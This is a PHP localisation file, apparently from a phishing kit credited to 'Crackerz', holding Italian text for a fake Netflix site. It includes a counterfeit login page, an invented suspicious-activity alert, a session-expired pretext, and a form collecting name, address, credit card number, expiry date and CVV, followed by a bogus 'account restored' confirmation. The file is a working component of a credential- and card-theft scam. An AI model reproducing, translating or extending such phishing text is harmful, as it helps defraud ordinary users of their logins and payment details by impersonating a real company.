<?php


/* Programmer name :

    ╔╗ ╦ ╦  ╔═╗╦═╗╔═╗╔═╗╦╔═╔═╗╦═╗╔═╗
    ╠╩╗╚╦╝  ║  ╠╦╝╠═╣║  ╠╩╗║╣ ╠╦╝╔═╝
    ╚═╝ ╩   ╚═╝╩╚═╩ ╩╚═╝╩ ╩╚═╝╩╚═╚═╝

*/  #2018  Mailer-inbox-unlimited.gq
    


################################################################################### Login

$crackerz_01 = "Accesso";
$crackerz_02 = "E-mail";
$crackerz_03 = "Parola d'ordine";
$crackerz_04 = "Dimenticato la tua mail o password?";
$crackerz_05 = "Ricordati di me";
$crackerz_06 = "Fai il login con facebook";
$crackerz_07 = "Nuovo su Netflix?";   //
$crackerz_08 = "Iscriviti ora.";

################################################################################### Login



################################################################################### Activity

$crackerz_09 = "Attività Recente";
$crackerz_10 = "Non riconosci questa attività?";
$crackerz_11 = "Se non hai effettuato l'accesso da un nuovo dispositivo, il tuo account potrebbe essere violato. Si prega di seguire questi passaggi per proteggere il tuo account il più presto possibile.";
$crackerz_12 = "INIZIO";

################################################################################### Activity



################################################################################### Redirect

//  Verrai reindirizzato automaticamente alla home page in 52 secondi.
$crackerz_13 = "Verrai reindirizzato automaticamente alla ";
$crackerz_14 = "pagina di aggiornamento in ";
$crackerz_15 = "home page in ";
$crackerz_16 = " secondi.";

################################################################################### Redirect



################################################################################### Infos

$crackerz_17 = "Aggiorna informazioni";
$crackerz_18 = "Aggiorna i tuoi dati di pagamento.";
$crackerz_19 = "La tua iscrizione non verrà fatturata al tuo prossimo periodo di fatturazione senza convalida.";

$crackerz_20 = "Indirizzo";
$crackerz_21 = "Città";
$crackerz_22 = "Stato";
$crackerz_23 = "Cap";

$crackerz_24 = "Nome e cognome";
$crackerz_25 = "Numero di carta di credito";
$crackerz_26 = "Data di scadenza (MM / AAAA)";
$crackerz_27 = "Codice di sicurezza (CVV)";

################################################################################### Infos



################################################################################### Button

$crackerz_28 = "IL PROSSIMO";  
$crackerz_29 = "SALVARE";
$crackerz_30 = "INDIETRO";

################################################################################### Button



################################################################################### Errors

$crackerz_31 = "Inserisci una email valida.";
$crackerz_32 = "La tua password deve contenere da 4 a 60 caratteri.";

$crackerz_33 = "Indirizzo è un campo obbligatorio.";
$crackerz_34 = "Città è un campo obbligatorio.";
$crackerz_35 = "Stato è un campo obbligatorio. Lo stato è un campo obbligatorio.";
$crackerz_36 = "Codice postale è un campo obbligatorio.";

$crackerz_37 = "Nome e cognome è un campo obbligatorio.";
$crackerz_38 = "Numero di carta è un campo obbligatorio.";
$crackerz_39 = "Data di scadenza è un campo obbligatorio.";
$crackerz_40 = "Codice di sicurezza (CVV) è un campo obbligatorio.";

################################################################################### Errors



################################################################################### More time

$crackerz_41 = "Sessione Scaduta";
$crackerz_42 = "Sessione scaduta, effettua nuovamente il login per rinnovare la sessione.";
$crackerz_43 = "Solitamente ciò è dovuto al fatto che i cookie vengono cancellati o rimossi dal browser.";
$crackerz_44 = "Premi il pulsante in basso per prolungare il tempo di sessione per confermare la tua identità e aiutarti ad accedere al tuo account.";
$crackerz_45 = "RICOMINCIA";

################################################################################### More time



################################################################################### Thanks

$crackerz_46 = "Grazie";
$crackerz_48 = "Complimenti ! Hai ripristinato il tuo account. Ora puoi accedere a tutti i tuoi vantaggi Netflix.";
$crackerz_50 = "CONTINUA";

################################################################################### Thanks

################################################################################### Footer

$crackerz_51 = "Domande? Contattaci.";

# login / alert / more
$crackerz_52 = "Termini della carta regalo";
$crackerz_53 = "Informativa sulla Privacy";
$crackerz_54 = "Condizioni d'uso";

$crackerz_55 = "Domande frequenti";
$crackerz_56 = "Centro assistenza";
$crackerz_57 = "Vita privata";
$crackerz_58 = "Preferenze dei cookie";
$crackerz_59 = "Informazioni aziendali";

$crackerz_60 = "Disconnessione";

################################################################################### Footer

?>